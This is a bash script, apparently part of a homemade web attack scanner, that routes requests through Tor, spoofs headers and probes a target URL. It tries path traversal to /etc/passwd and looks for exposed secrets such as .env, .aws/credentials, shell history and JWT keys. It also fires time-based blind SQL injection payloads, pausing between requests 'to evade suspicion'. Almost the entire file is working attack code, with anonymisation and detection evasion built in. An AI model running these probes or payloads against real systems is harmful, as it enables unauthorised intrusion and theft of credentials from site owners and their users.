# Code version = 1
# I myself still wondering, why do i name this "risk".
# Welp, sunshine and rainbow. For this file, me will make the variable good name! 
echo ""
echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
echo ""
sleep 3
# Dramatic function.
Chicken() {
    local crispy_thigh="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $target_url/$crispy_thigh ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))
}
# Gotta be minimalist below, he is a talkative guy.
time_audit_engine() {
    local extra_spicy_sauce="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$extra_spicy_sauce"
    local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
    echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
    if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
        local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
        if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
            echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;31m[!+!] ALERT: 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
        else
            echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
        fi
    else
        echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
        echo -e "\e[0;37m[-] Status: Safe, normal server response time.\e[0m"
    fi
    echo ""
}

gentle_probe_engine() {
    local fresh_salad="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Deploying Gentle Probing Matrix on: $target_url/$fresh_salad"
    local restaurant_cashier=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -X OPTIONS -A "Mozilla/5.0" -s -Iv "$target_url/$fresh_salad" --stderr - | grep -Ei "< (Allow|Server|X-Powered-By)")
    if [ -n "$restaurant_cashier" ]; then
        echo -e "$restaurant_cashier" | sed 's/^/    -> /'
    else
        echo -e "[i] Status: No explicit server footprint returned."
    fi
    echo ""
}

Chicken ".env%00"
Chicken "../../../../../../etc/passwd"
Chicken "phpmyadmin/config.inc.php"
Chicken ".mysql_history"
Chicken "config/jwt.txt"
Chicken ".env.bak"

echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
sleep 5

Chicken ".aws/credentials"
Chicken ".bash_history"
Chicken "config/database.yml"
Chicken "amplify/.config/local-env-info.json"

echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
sleep 5

Chicken "error_log"
Chicken "storage/logs/laravel.log"
Chicken "debug.log"
Chicken ".git/logs/HEAD"
Chicken ".idea/workspace.xml"

echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
sleep 5

#Time
time_audit_engine "/index.php?id=1'And(Select*From(Select("
sleep $((5 + RANDOM % 4)) # Kasih napas 5-8 detik biar server rileks

time_audit_engine "/api/users?search=test'And(Select*From(Select("
sleep $((5 + RANDOM % 4))

time_audit_engine "/view.php?type=1'+AND+7110=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101),2)--"
sleep $((6 + RANDOM % 3))

time_audit_engine "/api/v1/products?search=test\";WAITFOR DELAY '0:0:2'--"
sleep $((6 + RANDOM % 3))

time_audit_engine "/api/items?cat=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)"
sleep $((5 + RANDOM % 4))

#gentleman
gentle_probe_engine ".env"
sleep $((4 + RANDOM % 3))

gentle_probe_engine "wp-config.php"
sleep $((3 + RANDOM % 3))

gentle_probe_engine ".env%00"
sleep $((8 + RANDOM % 3))

gentle_probe_engine "mysql_history"
sleep $((3 + RANDOM % 3))

gentle_probe_engine "config/jwt.txt"
sleep $((4 + RANDOM % 3))

echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 5 seconds."
sleep 5
